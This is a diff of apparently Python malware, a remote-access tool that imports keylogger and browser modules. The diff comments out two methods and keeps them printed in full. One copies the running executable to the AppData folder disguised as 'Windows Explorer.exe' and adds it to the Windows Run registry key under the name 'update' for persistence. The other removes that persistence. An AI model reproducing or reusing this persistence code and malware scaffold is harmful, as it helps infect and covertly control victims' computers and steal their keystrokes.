@@ -7,7 +7,6 @@ import pyautogui
 import tempfile
 import keyboard
 import sys
-import shutil
 from Browser import browser
 from Keylogger import keylogger
 
@@ -77,22 +76,24 @@ QWiW0ZSeAk3ShZ0CvBwH5iMHrpUwVmXd6JAGLYbTsR/5ar3VKxEUb/yHhCba
                 continue
     
     def AddStartUp(self):
-        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
-        if not os.path.exists(evil_file_location):
-            shutil.copyfile(sys.executable,evil_file_location)
-            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
-            return "[+] Persistence added successfully"
-        else:
-            return "[-] Persistence already exists"
+        pass
+        # evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
+        # if not os.path.exists(evil_file_location):
+        #     shutil.copyfile(sys.executable,evil_file_location)
+        #     subprocess.call('reg add HKCU\\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True)
+        #     return "[+] Persistence added successfully"
+        # else:
+        #     return "[-] Persistence already exists"
     
     def RemoveStartUp(self):
-        evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
-        if os.path.exists(evil_file_location):
-            os.remove(evil_file_location)
-            subprocess.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',shell=True)
-            return "[+] Persistence removed successfully"
-        else:
-            return "[-] Persistence does not exist"    
+        pass
+        # evil_file_location=os.environ["appdata"]+"\\Windows Explorer.exe"
+        # if os.path.exists(evil_file_location):
+        #     os.remove(evil_file_location)
+        #     subprocess.call('reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /f',shell=True)
+        #     return "[+] Persistence removed successfully"
+        # else:
+        #     return "[-] Persistence does not exist"    
     
     def CD_Command(self,path):
         os.chdir(path)
